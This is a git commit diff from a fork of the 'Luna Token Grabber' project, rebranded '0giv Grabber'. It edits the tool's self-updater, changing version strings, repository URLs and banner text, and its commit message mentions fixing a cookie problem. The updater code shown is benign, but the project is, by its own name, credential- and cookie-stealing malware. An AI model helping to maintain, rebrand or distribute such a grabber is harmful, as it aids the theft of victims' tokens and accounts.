a334032461728e37ccfb7efda4374980ca78c8ef
0giv <138109429+0giv@users.noreply.github.com>
2025-08-28 10:29:14 +0300

    Adding new skills and Fixing the cookie problem

--- tools/update.py
+++ tools/update.py
@@ -7,14 +7,14 @@ import requests
 
 class Update():
     def __init__(self):
-        self.version = '1.5.5'
-        self.github = 'https://raw.githubusercontent.com/Smug246/Luna-Grabber/main/tools/update.py'
-        self.zipfile = 'https://github.com/Smug246/Luna-Grabber/archive/refs/heads/main.zip'
+        self.version = '1.0'
+        self.github = 'https://raw.githubusercontent.com/0giv/0giv-Grabber/main/tools/update.py'
+        self.zipfile = 'https://github.com/0giv/0giv-Grabber/archive/refs/heads/main.zip'
         self.update_checker()
 
     def update_checker(self):
         code = requests.get(self.github).text
-        if "self.version = '1.5.5'" in code:
+        if "self.version = '1.0'" in code:
             print('This version is up to date!')
             print('Exiting...')
             sleep(2)
@@ -27,15 +27,15 @@ class Update():
                     ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                     ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                     ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
-                                      Your version of Luna Token Grabber is outdated!''')
+                                      Your version of 0giv Grabber is outdated!''')
             choice = input('\nWould you like to update? (y/n): ')
             if choice.lower() == 'y':
                 new_version_source = requests.get(self.zipfile)
-                with open("Luna-Grabber-main.zip", 'wb')as zipfile:
+                with open("0giv-Grabber-main.zip", 'wb')as zipfile:
                     zipfile.write(new_version_source.content)
-                with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
+                with ZipFile("0giv-Grabber-main.zip", 'r') as filezip:
                     filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
-                os.remove("Luna-Grabber-main.zip")
+                os.remove("0giv-Grabber-main.zip")
                 print('The new version is now on your desktop.\nUpdate Complete!')
                 print("Exiting...")
                 sleep(5)
